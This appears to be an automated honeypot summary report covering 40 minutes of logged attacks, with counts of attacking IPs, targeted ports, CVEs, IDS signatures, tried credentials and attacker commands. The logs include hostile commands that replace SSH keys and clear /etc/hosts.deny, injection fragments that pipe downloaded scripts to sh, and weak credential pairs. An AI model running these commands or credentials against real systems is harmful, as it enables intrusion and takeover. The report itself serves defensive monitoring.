Honeypot Attack Summary Report

Report generated at: 2025-10-20T07:01:30Z
Timeframe of logs: 2025-10-20T06:20:01Z to 2025-10-20T07:00:01Z
Files used for this report:
- agg_log_20251020T062001Z.json
- agg_log_20251020T064001Z.json
- agg_log_20251020T070001Z.json

Executive Summary
This report summarizes 7361 events collected from the honeypot network. The majority of attacks were captured by the Cowrie honeypot. The most frequent attacks originated from the IP address 72.146.232.13. The most targeted port was 22 (SSH). A number of CVEs were targeted, and a variety of commands were attempted by attackers.

Detailed Analysis:

Attacks by honeypot:
- Cowrie: 3631
- Honeytrap: 1716
- Suricata: 914
- Sentrypeer: 369
- Ciscoasa: 450
- Dionaea: 61
- Tanner: 58
- ConPot: 40
- Miniprint: 41
- Redishoneypot: 28
- H0neytr4p: 22
- Mailoney: 15
- ElasticPot: 6
- Honeyaml: 5
- Heralding: 3
- Wordpot: 1
- Ipphoney: 1

Top attacking IPs:
- 72.146.232.13: 612
- 88.214.50.58: 373
- 177.157.203.149: 321
- 77.83.240.70: 282
- 103.231.14.54: 257
- 190.108.60.101: 227
- 165.154.200.14: 232
- 122.35.192.61: 174
- 185.243.5.103: 146
- 37.152.189.98: 189
- 45.249.245.22: 189
- 103.189.235.66: 155
- 196.12.203.185: 149
- 185.243.5.158: 175
- 107.170.36.5: 151
- 68.183.149.135: 112
- 103.189.234.85: 83
- 41.216.177.55: 90
- 167.250.224.25: 50
- 182.93.7.194: 60

Top targeted ports/protocols:
- 22: 609
- 5060: 369
- 8333: 132
- 80: 52
- 5905: 76
- 5904: 75
- 1025: 38
- 9100: 41
- 445: 26
- 6379: 22
- 23: 15
- TCP/80: 28
- TCP/8080: 21
- TCP/22: 19
- TCP/443: 9
- TCP/1521: 9
- TCP/1433: 9
- 443: 20
- 5901: 42
- 5902: 41
- 5903: 38
- 9000: 21
- 9443: 15
- 2121: 16
- 7547: 12
- 9002: 7
- 9999: 14
- 33890: 7
- 135: 9
- 4444: 9

Most common CVEs:
- CVE-2024-4577
- CVE-2002-0953
- CVE-2019-11500
- CVE-2005-4050
- CVE-2021-41773
- CVE-2021-42013
- CVE-2021-3449
- CVE-2023-26801
- CVE-2019-16920
- CVE-2023-31983
- CVE-2009-2765
- CVE-2020-10987
- CVE-2023-47565
- CVE-2014-6271
- CVE-2015-2051
- CVE-2019-10891
- CVE-2024-33112
- CVE-2025-11488
- CVE-2022-37056
- CVE-2006-2369
- CVE-2002-0013
- CVE-2002-0012

Commands attempted by attackers:
- cd ~; chattr -ia .ssh; lockr -ia .ssh: 16
- lockr -ia .ssh: 16
- cd ~ && rm -rf .ssh && mkdir .ssh && echo ...: 16
- cat /proc/cpuinfo | grep name | wc -l: 16
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 16
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 16
- ls -lh $(which ls): 16
- which ls: 16
- crontab -l: 16
- w: 16
- uname -m: 16
- cat /proc/cpuinfo | grep model | grep name | wc -l: 16
- top: 16
- uname: 16
- uname -a: 16
- whoami: 16
- lscpu | grep Model: 16
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 16
- Enter new UNIX password: : 11
- Enter new UNIX password:": 11
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;: 2
- echo -e \"1234\\nl7Jh54K69Lo8\\nl7Jh54K69Lo8\"|passwd|bash: 1

Signatures triggered:
- ET DROP Dshield Block Listed Source group 1: 179
- 2402000: 179
- ET SCAN NMAP -sS window 1024: 80
- 2009582: 80
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 206
- 2023753: 206
- ET INFO Reserved Internal IP Traffic: 42
- 2002752: 42
- ET HUNTING RDP Authentication Bypass Attempt: 93
- 2034857: 93
- ET CINS Active Threat Intelligence Poor Reputation IP group 51: 5
- 2403350: 5
- ET CINS Active Threat Intelligence Poor Reputation IP group 3: 9
- 2403302: 9
- ET SCAN Potential SSH Scan: 9
- 2001219: 9
- ET SCAN Suspicious inbound to Oracle SQL port 1521: 8
- 2010936: 8
- ET SCAN Suspicious inbound to mSQL port 4333: 4
- 2010938: 4
- ET CINS Active Threat Intelligence Poor Reputation IP group 50: 9
- 2403349: 9
- ET CINS Active Threat Intelligence Poor Reputation IP group 45: 5
- 2403344: 5
- ET CINS Active Threat Intelligence Poor Reputation IP group 13: 4
- 2403312: 4
- ET CINS Active Threat Intelligence Poor Reputation IP group 49: 4
- 2403348: 4
- ET CINS Active Threat Intelligence Poor Reputation IP group 44: 3
- 2403343: 3
- ET INFO CURL User Agent: 9
- 2002824: 9
- ET ATTACK_RESPONSE Possible MS CMD Shell opened on local system: 9
- 2008953: 9
- ET SCAN Suspicious inbound to MSSQL port 1433: 8
- 2010935: 8
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41: 4
- 2400040: 4

Users / login attempts:
- 345gs5662d34/345gs5662d34: 15
- deploy/123123: 11
- user01/Password01: 11
- ftpuser/admin1234: 4
- magazyn/123: 4
- l/l: 4
- root/Abc123@@: 3
- ruben/123: 3
- root/Admin2022!: 3
- netadmin/netadmin: 3
- dara/dara: 3
- root/root.2025: 2
- root/Cl123456@: 2
- root/Abc@123..: 2
- root/debian@123: 2
- pam/pam: 2
- informatica/123: 2
- root/zaq1XSW2: 2
- root/a2b4c6d8e9: 2
- root/dragon: 2
- zookeeper/zookeeper: 2
- root/123qweASD: 2
- root/a2billing: 2
- rke/rke123: 2
- vipin/vipin123: 2
- root/a2billing_mgr: 2
- root/Abc12345: 2
- backup/backup@123: 2
- admin01/123: 2
- root/Secret123: 2
- angel/1234: 2
- be/be@123: 2
- root/root@1234: 2
- taba/123: 2
- dev/dev2022: 2
- nacos/nacos: 2
- root/wizard: 2
- wyse/123: 2
- shweta/shweta: 2
- root/PASSw0rd: 2
- root/a888520...: 2
- root/root.123456: 2
- michael/123: 2
- dara/123: 2
- dal/dal: 2
- root/kk: 2
- root/A2rasucr5ph: 2
- root/3245gs5662d34: 2
- root/a516497toca: 2

Files uploaded/downloaded:
- sh: 98
- server.cgi?func=server02_main_submit&counter=6.7496022225883&TEST_BTN4=: 2
- rondo.qre.sh||busybox: 2
- rondo.qre.sh||curl: 2
- rondo.qre.sh)|sh: 2
- `busybox`: 2
- login_pic.asp: 1
- rondo.sbx.sh|sh&echo${IFS}: 1

HTTP User-Agents:
- None

SSH clients and servers:
- None

Top attacker AS organizations:
- None

Key Observations and Anomalies
- The attacker at 72.146.232.13 is particularly persistent, with over 600 events.
- The commands attempted are typical of initial reconnaissance and attempts to disable security measures.
- A wide variety of CVEs are being scanned for, indicating broad, opportunistic attacks.
- The high number of login attempts with default or weak credentials suggests that attackers are still finding success with this method.
